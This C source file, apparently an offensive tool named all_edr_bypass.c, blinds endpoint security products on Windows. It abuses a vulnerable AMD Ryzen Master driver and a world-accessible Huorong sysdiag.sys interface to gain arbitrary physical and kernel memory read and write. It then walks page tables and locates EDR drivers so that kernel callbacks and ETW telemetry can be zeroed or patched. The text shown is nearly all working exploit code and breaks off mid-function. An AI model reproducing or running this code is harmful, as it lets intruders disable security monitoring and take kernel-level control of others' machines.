/*
 * all_edr_bypass.c — Combined EDR kernel callback bypass
 *
 * Single executable. Runs all 6 bypass modules in optimal order:
 *
 *   [1] Watchdog Kill       — patch IAT calls to re-registration functions
 *   [2] Ps* Notify          — zero PspCreate/Load/Thread notify arrays
 *   [3] ObRegisterCallbacks — zero PreOperation/PostOperation pointers
 *   [4] Minifilter          — patch PreOperation functions → xor eax,eax;ret
 *   [5] ETW-TI              — patch EtwTiLog* prologue + zero IsEnabled
 *   [6] CmRegisterCallback  — zero Function pointers
 *
 * Auto-detects EDR drivers (anything not in system/network/VM whitelist).
 * Shows CompanyName from VersionInfo for every unknown driver.
 * Single "Proceed? [y/N]" → apply all → "Press Enter to restore all".
 * Ctrl+C / console close → emergency restore.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -Wno-format-truncation -Wno-unused-but-set-variable \
 *       -o edr_bypass.exe edr_bypass.c \
 *       -lkernel32 -ladvapi32 -lversion -ldbghelp -lntdll
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ══════════════════════════════════════════════════════════════════════
 * §1  COMMON INFRASTRUCTURE
 * ══════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* Physical ranges */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0,KEY_READ,&h)!=ERROR_SUCCESS) return;
    char vname[256]; DWORD vn,vd,type; uint8_t *buf=NULL; DWORD sz=0;
    for(DWORD i=0;;i++){
        vn=sizeof vname; vd=0;
        if(RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if(!buf) continue;
        if(RegQueryValueExA(h,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(h);
    if(!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for(DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* Physical I/O */
/* chunk size — 256 KB gives 4x fewer IOCTL calls vs the old 64 KB */
#define CHUNK_SZ 0x40000

/* Pre-allocated I/O output buffer: avoids a malloc+free per phys_read call.
 * Used for all reads ≤ CHUNK_SZ (the common case).  Larger reads fall back
 * to heap allocation (rare: only for small fixed-size struct reads > 256 KB,
 * which never happen in practice). */
static uint8_t g_io_out[12 + CHUNK_SZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz;
    uint32_t osz=12+sz;
    uint8_t *out; void *dyn=NULL;
    if(osz<=sizeof g_io_out) out=g_io_out;
    else{dyn=malloc(osz);if(!dyn) return 0;out=(uint8_t*)dyn;}
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in,12,out,osz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(dyn); return ok&&got>=12;
}
static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t isz=12+sz; uint8_t *in=(uint8_t*)malloc(isz); if(!in) return 0;
    *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz; memcpy(in+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in,isz,NULL,0,&got,NULL);
    free(in); return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §SD  SYSDIAG IOCTL PRIMITIVE
 *
 * sysdiag.sys exposes \\.\SysDiag::IOKit with SDDL D:P(A;;GA;;;WD) —
 * any local user.  Two IOCTLs give arbitrary kernel VA R/W:
 *
 *   0x228048: read  — memmove(user_dst, kernel_src, size)
 *   0x22804C: write — InterlockedExchange via MDL alias (LOCK XCHG)
 *
 * LOCK XCHG on the UC MDL alias forces a global MESI M→I on other
 * cores' WB-cached lines for the same PA, so the new value is
 * immediately visible to any subsequent kernel read.  No eviction needed.
 *
 * The write path also uses MmProtectMdlSystemAddress(PAGE_READWRITE), so
 * it bypasses WP-bit protection (same PA, different mapping).
 * ══════════════════════════════════════════════════════════════════════ */

#define SD_DEVICE     "\\\\.\\SysDiag::IOKit"
#define SD_IOCTL_READ  0x228048u
#define SD_IOCTL_WRITE 0x22804Cu

/* Buffer layout: packed (QWORD at offset +4, unaligned) — from IDA analysis */
#pragma pack(push,1)
typedef struct { uint32_t mode; uint64_t src_va; uint64_t out_ptr; uint32_t size; uint32_t use_mdl; } SD_RReq;
typedef struct { uint32_t mode; uint64_t dst_va; uint64_t src_ptr; uint32_t size; uint32_t use_mdl; } SD_WReq;
#pragma pack(pop)

static HANDLE g_sd_dev = INVALID_HANDLE_VALUE;

static int sd_open(void)
{
    if(g_sd_dev != INVALID_HANDLE_VALUE) return 1;
    g_sd_dev = CreateFileA(SD_DEVICE, GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
    if(g_sd_dev == INVALID_HANDLE_VALUE){
        printf("    [SD] Open " SD_DEVICE " FAIL err=%lu\n", GetLastError());
        return 0;
    }
    printf("    [SD] Opened " SD_DEVICE "\n");
    return 1;
}

/* Read kernel VA — data written to *buf by driver (not via DeviceIoControl output) */
static int sd_read_kva(uint64_t kva, void *buf, uint32_t size)
{
    if(g_sd_dev == INVALID_HANDLE_VALUE && !sd_open()) return 0;
    SD_RReq req = {0};
    req.mode    = 0;
    req.src_va  = kva;
    req.out_ptr = (uint64_t)(uintptr_t)buf;
    req.size    = size;
    req.use_mdl = 0;
    uint32_t ns = 0xDEADBEEF; DWORD got = 0;
    DeviceIoControl(g_sd_dev, SD_IOCTL_READ, &req, sizeof(req),
                    &ns, sizeof(ns), &got, NULL);
    return ns == 0;
}

/* Write kernel VA — atomic InterlockedExchange (WB-coherent, no eviction needed) */
static int sd_write_kva(uint64_t kva, const void *buf, uint32_t size)
{
    if(g_sd_dev == INVALID_HANDLE_VALUE && !sd_open()) return 0;
    SD_WReq req = {0};
    req.mode    = 0;
    req.dst_va  = kva;
    req.src_ptr = (uint64_t)(uintptr_t)buf;
    req.size    = size;
    req.use_mdl = 1;
    uint32_t ns = 0xDEADBEEF; DWORD got = 0;
    DeviceIoControl(g_sd_dev, SD_IOCTL_WRITE, &req, sizeof(req),
                    &ns, sizeof(ns), &got, NULL);
    return ns == 0;
}

/* Read-modify-write a single byte at any kernel VA via a 4-byte
 * InterlockedExchange (LOCK XCHG32).  The LOCK prefix forces a bus-level
 * cache-coherency event: other cores' WB-cached lines for the same PA are
 * invalidated, so the new value is immediately visible to subsequent WB reads
 * (including kernel NtQIP / OpenProcess) without any separate cache eviction.
 * Size-1 writes via sd_write_kva use a plain byte assignment (no LOCK), so
 * they do NOT have this property — this helper is mandatory for Protection. */
static int sd_write_byte_atomic4(uint64_t va, uint8_t newval)
{
    if(!sd_open()) return 0;
    uint32_t byteoff  = (uint32_t)(va & 3);
    uint64_t aligned  = va & ~(uint64_t)3;
    uint32_t cur = 0;
    if(!sd_read_kva(aligned, &cur, 4)) return 0;
    uint32_t newdw = (cur & ~(0xFFu << (byteoff*8))) | ((uint32_t)newval << (byteoff*8));
    return sd_write_kva(aligned, &newdw, 4);
}

/* ── Kernel page table walker ───────────────────────────────────────────
 * Windows keeps a self-referencing PML4 entry at index 0x1ED so the kernel
 * can access its own page tables via well-known VAs.  We exploit that:
 * PML4[0x1ED] must point back to the PML4's own physical frame.
 * Scanning only the first 128 MB is sufficient on real hardware; on VMs the
 * PML4 is typically in the first 4 MB.
 * ─────────────────────────────────────────────────────────────────────── */
static uint64_t g_kernel_cr3=0;
static int      g_paging_5l =0; /* 1 = 5-level paging (LA57): CR3→PML5→PML4→... */

/* Count present entries in kernel half of PML4 (slots 0x100..0x1FE, excluding self-ref).
 * Full KernelCR3: maps pool + drivers + hal = many entries (typically 10-30+).
 * KPTI shadow UserCR3: maps only minimal kernel stub = very few entries (1-3).
 * Threshold of 4 reliably distinguishes them. */
static int pml4_kernel_entry_count(const uint8_t *pg4k, int self_ref_idx)
{
    int n = 0;
    for (int i = 0x100; i < 0x1FF; i++) {
        if (i == self_ref_idx) continue;
        uint64_t e = *(uint64_t*)(pg4k + i*8);
        if (e & 1) n++;
    }
    return n;
}

static uint64_t find_kernel_cr3(uint64_t nt_va)
{
    (void)nt_va; /* detection now done in detect_paging_mode() after CR3 is found */
    static uint8_t s_pg[4096];

    /* Pass 1 — fast: check only slot 0x1ED (standard Windows 10 / early 11).
     * Validate with kernel-entry count to reject KPTI shadow UserCR3. */
    for(int ri=0;ri<g_nranges;ri++){
        if(g_ranges[ri].base>=0x10000000ULL) continue;
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        if(re>0x10000000ULL) re=0x10000000ULL;
        for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
            uint64_t e=0;
            if(!phys_read(pa+0x1ED*8,&e,8)) continue;
            if(!((e&1)&&(e&0x000FFFFFFFFFF000ULL)==pa)) continue;
            if(!phys_read(pa,s_pg,4096)) continue;
            if(pml4_kernel_entry_count(s_pg,0x1ED) < 4) continue;
            return pa;
        }
    }

    /* Pass 2 — thorough: randomised self-ref slot (Win11 22H2+), first 64 MB. */
    for(int ri=0;ri<g_nranges;ri++){
        if(g_ranges[ri].base>=0x4000000ULL) continue;
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        if(re>0x4000000ULL) re=0x4000000ULL;
        for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
            if(!phys_read(pa,s_pg,4096)) continue;
            for(int idx=0x100;idx<0x200;idx++){
                uint64_t e=*(uint64_t*)(s_pg+idx*8);
                if(!(e&1)) continue;
                if((e&0x000FFFFFFFFFF000ULL)!=pa) continue;
                if(pml4_kernel_entry_count(s_pg,idx) < 4) continue;
                return pa;
            }
        }
    }
    return 0;
}

/* Find kernel CR3 by scanning physical RAM for System EPROCESS (PID=4) and reading
 * EPROCESS.DirectoryTableBase at +0x28.  More reliable than self-ref PML4 scan because:
 *   • Works regardless of where the PML4/PML5 page is in physical RAM (no 64MB limit)
 *   • Works for both 4-level and 5-level paging
 *   • Not affected by false-positive self-referencing pages
 * Must be called AFTER g_ranges is populated.  Uses EP_OFF_PID / EP_OFF_NAME constants
 * that are defined later — we forward-declare the values literally to avoid reordering. */
static uint64_t find_cr3_from_system_eprocess(void)
{
    /* EP offsets (same values as the #defines below, used here before they're visible) */
    const uint32_t pid_off  = 0x440u;
    const uint32_t name_off = 0x5A8u;
    const uint32_t dtb_off  = 0x28u;  /* EPROCESS.DirectoryTableBase — stable across versions */
    const uint32_t ep_scan  = 0x5C0u; /* bytes to read per candidate */

    /* Use a 256KB local chunk for scanning — matches CHUNK_SZ but doesn't depend on g_chunk */
    static uint8_t scan_buf[0x40000];
    static uint8_t ep[0x600];
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=sizeof(scan_buf)){
            uint64_t csz=re-cpa; if(csz>sizeof(scan_buf)) csz=sizeof(scan_buf);
            if(!phys_read(cpa,scan_buf,(uint32_t)csz)) continue;
            /* Stride 8: EPROCESS is 8-byte aligned; start at pid_off to avoid underflow */
            for(uint64_t off=pid_off;off+ep_scan<=csz;off+=8){
                /* Quick PID=4 check at +pid_off */
                if(*(uint64_t*)(scan_buf+off)!=4ULL) continue;
                /* Candidate EPROCESS base = cpa + off - pid_off */
                uint64_t ep_pa=cpa+off-pid_off;
                if(!phys_read(ep_pa,ep,ep_scan)) continue;
                /* Verify: PID==4 and ImageFileName=="System" */
                if(*(uint64_t*)(ep+pid_off)!=4ULL) continue;
                if(memcmp(ep+name_off,"System",6)!=0) continue;
                /* Read DirectoryTableBase */
                uint64_t dtb=*(uint64_t*)(ep+dtb_off);
                if(!dtb||(dtb&0xFFF)||dtb>0x200000000000ULL) continue;
                printf("    System EPROCESS PA=0x%llX  DTB=0x%llX\n",
                       (unsigned long long)ep_pa,(unsigned long long)dtb);
                return dtb;
            }
        }
    }
    return 0;
}

/* Page-table walk: kernel VA → physical address (0 = not mapped).
 * Supports both 4-level (LA48) and 5-level (LA57) paging.
 * g_paging_5l=1 → CR3 points to PML5; add one extra indirection before PML4. */
static uint64_t va_to_pa(uint64_t va)
{
    if(!g_kernel_cr3) return 0;
    uint64_t root=g_kernel_cr3, e=0;
    if(g_paging_5l){
        uint64_t pml5i=(va>>48)&0x1FF;
        if(!phys_read(root+pml5i*8,&e,8)||!(e&1)) return 0;
        root=e&0x000FFFFFFFFFF000ULL; /* PML4 table PA */
        e=0;
    }
    uint64_t pml4i=(va>>39)&0x1FF, pdpi=(va>>30)&0x1FF;
    uint64_t pdi  =(va>>21)&0x1FF, pti =(va>>12)&0x1FF;
    if(!phys_read(root+pml4i*8,&e,8)||!(e&1)) return 0;
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pdpi*8,&e,8)||!(e&1)) return 0;
    if(e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF); /* 1 GB */
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pdi*8,&e,8)||!(e&1)) return 0;
    if(e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);  /* 2 MB */
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pti*8,&e,8)||!(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

/* After find_kernel_cr3(), determine if CR3 is PML5 (5-level / LA57).
 * Strategy: with ntoskrnl VA known, try 4-level walk. If PML4 entry not present,
 * try as PML5 — read PML5[pml5i] → PML4, then check PML4[pml4i] present.
 * Sets g_paging_5l and updates g_kernel_cr3 usage accordingly. */
static void detect_paging_mode(uint64_t nt_va)
{
    if(!g_kernel_cr3||!nt_va) return;
    uint64_t pml4i=(nt_va>>39)&0x1FF;
    uint64_t e4=0;
    phys_read(g_kernel_cr3+pml4i*8,&e4,8);
    if(e4&1){ g_paging_5l=0; printf("    Paging: 4-level (LA48)\n"); return; }

    /* PML4 entry not present → try 5-level */
    uint64_t pml5i=(nt_va>>48)&0x1FF;
    uint64_t e5=0;
    phys_read(g_kernel_cr3+pml5i*8,&e5,8);
    if(!(e5&1)){ printf("    [!] Paging detection failed\n"); return; }
    uint64_t pml4_pa=e5&0x000FFFFFFFFFF000ULL;
    e4=0; phys_read(pml4_pa+pml4i*8,&e4,8);
    if(e4&1){
        g_paging_5l=1;
        printf("    Paging: 5-level (LA57) — PML5 @ 0x%llX  PML4 @ 0x%llX\n",
               (unsigned long long)g_kernel_cr3,(unsigned long long)pml4_pa);
    } else {
        printf("    [!] Paging detection inconclusive — 5-level PML4[0x%llX] not present\n",
               (unsigned long long)pml4i);
    }
}

/* Module list */
typedef NTSTATUS(NTAPI*PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

#define MAX_MODS 256
typedef struct { uint64_t base,size; char name[64]; } KMod;
static KMod g_mods[MAX_MODS]; static int g_nmods=0;

static void load_module_map(void)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return;
    for(ULONG i=0;i<ml->NumberOfModules&&g_nmods<MAX_MODS;i++){
        g_mods[g_nmods].base=(uint64_t)ml->Modules[i].ImageBase;
        g_mods[g_nmods].size=ml->Modules[i].ImageSize;
        const char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        strncpy(g_mods[g_nmods].name,fn,63); g_mods[g_nmods].name[63]='\0';
        g_nmods++;
    }
    free(ml);
}

static const char *va_to_driver(uint64_t va)
{ for(int i=1;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size) return g_mods[i].name; return NULL; }
static const char *va_to_driver_ex(uint64_t va,uint64_t *rva)
{ for(int i=1;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size){ if(rva)*rva=va-g_mods[i].base; return g_mods[i].name; } return NULL; }
static int va_in_any_module(uint64_t va)
{ for(int i=0;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size) return 1; return 0; }
/* Detect Huorong: any of the three Huorong drivers present in module list.
 * Used to skip operations that would trigger sysdiag.sys integrity check. */
static int huorong_is_active(void)
{
    static const char *hr[]={"sysdiag.sys","hrdevmon.sys","hrwfpdrv.sys",NULL};
    for(int i=0;i<g_nmods;i++)
        for(int j=0;hr[j];j++)
            if(_stricmp(g_mods[i].name,hr[j])==0) return 1;
    return 0;
}

/* Driver classification */
typedef enum { DRV_SYSTEM, DRV_NETWORK, DRV_VM, DRV_OTHER } DrvClass;
static DrvClass classify_driver(const char *n)
{
    static const char *SYS[]={
        "Ntfs.sys","FLTMGR.SYS","fileinfo.sys","Wof.sys","refs.sys","FastFat.sys",
        "exfat.sys","cdfs.sys","udfs.sys","rdbss.sys","luafv.sys","npfs.sys","mup.sys",
        "DfsC.sys","dfsc.sys","mrxsmb.sys","mrxsmb10.sys","mrxsmb20.sys","rdpdr.sys",
        "WebDAVSystem.sys","volmgrx.sys","volmgr.sys","disk.sys","storport.sys",
        "classpnp.sys","CLFS.SYS","fvevol.sys","iorate.sys","storqosflt.sys",
        "EhStorClass.sys","win32kfull.sys","win32kbase.sys","ksecdd.sys","cng.sys",
        "WindowsTrustedRT.sys","WindowsTrustedRTProxy.sys","bindflt.sys","wcifs.sys",
        "PrjFlt.sys","cloud_filter.sys","cldflt.sys","FileCrypt.sys","WinSetupMon.sys",
        "FsDepends.sys","peauth.sys","sysdiag.sys","bfs.sys","Ndu.sys",
        "SleepStudyHelper.sys","applockerfltr.sys","werkernel.sys","pcw.sys",
        "DxgKrnl.sys","dxgmms2.sys","condrv.sys","CI.dll","ci.dll",NULL};
    static const char *NET[]={
        "tcpip.sys","HTTP.sys","msquic.sys","tdx.sys","afd.sys","netbt.sys",
        "ndis.sys","netio.sys","pacer.sys","rpcxdr.sys","nsiproxy.sys","wfplwfs.sys",
        "ndisimplatform.sys","ndistapi.sys","ndiswan.sys","tunnel.sys","PPTP.sys",
        "rassstp.sys","wanarp.sys","wanarpv6.sys","bowser.sys","srv2.sys","srvnet.sys",NULL};
    static const char *VM[]={
        "vmhgfs.sys","vmmemctl.sys","vmxnet3nd.sys","vmci.sys","vmbus.sys",
        "hvsocket.sys","hyperkbd.sys","hvnetvsc.sys","VBoxGuest.sys","VBoxMouse.sys",
        "VBoxSF.sys","xenfilt.sys","xenbus.sys","xenvbd.sys","xenvif.sys",NULL};
    for(int i=0;SYS[i];i++) if(_stricmp(n,SYS[i])==0) return DRV_SYSTEM;
    for(int i=0;NET[i];i++) if(_stricmp(n,NET[i])==0) return DRV_NETWORK;
    for(int i=0;VM[i]; i++) if(_stricmp(n,VM[i]) ==0) return DRV_VM;
    return DRV_OTHER;
}

/* PE export RVA lookup */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;
    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}}\
        while(0)
    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* PE: RVA in writable data section? */
static int rva_in_data_section(const uint8_t *pe, size_t pe_sz, uint32_t rva)
{
    if(pe_sz<0x40||pe[0]!='M'||pe[1]!='Z') return 0;
    uint32_t po=*(uint32_t*)(pe+0x3C); if(po+24>pe_sz) return 0;
    uint16_t ns=*(uint16_t*)(pe+po+6),os=*(uint16_t*)(pe+po+20);
    uint32_t st=po+24+os;
    for(int i=0;i<ns;i++){
        uint32_t s=st+i*40; if(s+40>pe_sz) break;
        uint32_t va=*(uint32_t*)(pe+s+12),vs=*(uint32_t*)(pe+s+16),chr=*(uint32_t*)(pe+s+36);
        if(rva<va||rva>=va+vs) continue;
        int ic=(chr&0x20)||(chr&0x20000000U), iw=(chr&0x40)&&(chr&0x80000000U);
        return iw&&!ic;
    }
    return 0;
}

/* RVA → file offset */
static uint32_t rva_to_fo(const uint8_t *pe, uint32_t fsz, uint32_t rva)
{
    if(fsz<0x40||pe[0]!='M'||pe[1]!='Z') return 0;
    uint32_t po=*(uint32_t*)(pe+0x3C); if(po+24>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+po+6),os=*(uint16_t*)(pe+po+20);
    uint32_t st=po+24+os;
    for(int i=0;i<ns;i++){
        uint32_t s=st+i*40; if(s+40>fsz) break;
        uint32_t va=*(uint32_t*)(pe+s+12),vs=*(uint32_t*)(pe+s+16),ro=*(uint32_t*)(pe+s+20);
        if(rva>=va&&rva<va+vs) return ro+(rva-va);
    }
    return 0;
}

/* Scan chunk buffer — sized to match CHUNK_SZ defined in phys_read section */
static uint8_t g_chunk[CHUNK_SZ];

/* ntoskrnl PA via 2MB NtBuildNumber scan */
static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL); uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber"); free(pe); if(!rva) return 0;
    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;
    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1),end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva,4)) continue;
            uint32_t v=0; phys_read(pa+rva,&v,4);
            if(v!=c0&&v!=c1&&v!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if(mz==0x5A4D) return pa;
        }
    }
    return 0;
}

/* Driver path finder */
static int find_driver_path(const char *drv, char *out, int max)
{
    char wd[512],sd[512]; GetWindowsDirectoryA(wd,sizeof wd); GetSystemDirectoryA(sd,sizeof sd);
    snprintf(out,max,"%s\\drivers\\%s",sd,drv); if(GetFileAttributesA(out)!=INVALID_FILE_ATTRIBUTES) return 1;
    snprintf(out,max,"%s\\%s",sd,drv);          if(GetFileAttributesA(out)!=INVALID_FILE_ATTRIBUTES) return 1;
    snprintf(out,max,"%s\\SysWOW64\\drivers\\%s",wd,drv); return GetFileAttributesA(out)!=INVALID_FILE_ATTRIBUTES;
}

/* Driver PA via MZ+TimeDateStamp scan */
static uint64_t find_driver_pa(const char *drv)
{
    char path[1024]; if(!find_driver_path(drv,path,sizeof path)) return 0;
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    uint8_t hdr[0x200]={0}; DWORD rd=0; ReadFile(hf,hdr,sizeof hdr,&rd,NULL); CloseHandle(hf);
    if(rd<0x50||hdr[0]!='M'||hdr[1]!='Z') return 0;
    uint32_t po=*(uint32_t*)(hdr+0x3C); if(po+12>rd||*(uint32_t*)(hdr+po)!=0x00004550) return 0;
    uint16_t mach=*(uint16_t*)(hdr+po+4); uint32_t ts=*(uint32_t*)(hdr+po+8);
    uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){printf("      [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+0x50<=csz;off+=0x1000){
                if(g_chunk[off]!='M'||g_chunk[off+1]!='Z') continue;
                uint32_t peo=*(uint32_t*)(g_chunk+off+0x3C); if(peo+12>csz-off) continue;
                if(*(uint32_t*)(g_chunk+off+peo)!=0x00004550) continue;
                if(*(uint16_t*)(g_chunk+off+peo+4)!=mach) continue;
                if(*(uint32_t*)(g_chunk+off+peo+8)!=ts) continue;
                printf("      Found at PA=0x%016llX\n",(unsigned long long)(cpa+off));
                return cpa+off;
            }
        }
    }
    printf("      Not found\n"); return 0;
}

/* Driver PA via function prologue pattern scan (fallback if header zeroed) */
static uint64_t find_driver_pa_by_func(const char *drv, uint64_t func_va, uint64_t drv_va)
{
    uint32_t rva=(uint32_t)(func_va-drv_va);
    char path[1024]; if(!find_driver_path(drv,path,sizeof path)) return 0;
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL); uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t fo=rva_to_fo(pe,fsz,rva); uint8_t pat[16]={0};
    if(fo&&fo+16<=fsz) memcpy(pat,pe+fo,16);
    free(pe);
    if(!pat[0]||pat[0]==0xCC||pat[0]==0x90) return 0;
    uint64_t found=0; int nf=0; uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){printf("      [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+16<=csz;off++){
                if(memcmp(g_chunk+off,pat,16)) continue;
                uint64_t base=cpa+off-rva;
                if(pa_in_range(base,0x1000)){if(!nf)found=cpa+off;nf++;}
            }
        }
    }
    printf("      \n");
    if(nf==1){printf("      func_pa=0x%016llX  drv_base=0x%016llX\n",(unsigned long long)found,(unsigned long long)(found-rva));return found-rva;}
